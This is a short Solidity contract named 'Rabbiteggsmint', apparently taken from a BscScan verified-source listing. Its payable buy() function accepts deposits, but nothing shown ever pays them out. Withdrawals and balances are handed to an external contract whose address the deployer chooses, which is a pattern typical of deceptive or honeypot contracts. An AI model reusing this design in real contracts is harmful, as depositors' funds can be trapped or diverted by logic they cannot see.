/**
 *Submitted for verification at BscScan.com on 2022-08-01
*/

// SPDX-License-Identifier: MIT
// pragma solidity >=0.4.21 <8.10.0; 
pragma solidity ^0.8.11;


contract Rabbiteggsmint
{

  Caller caller;
    
    constructor(address _caller) {
        caller = Caller(_caller); 
    }

      function buy() public payable {  }

      function withdraw() public {
        caller.WithdrawToken();
    }

    function getBalance(address _usrAddress) public view returns (uint256) {  
       return caller.getBal(_usrAddress);
     }  
}


contract Caller {

    function WithdrawToken() public  {   }  
    function getBal(address _usrAddress) public view returns (uint256) {   }  

}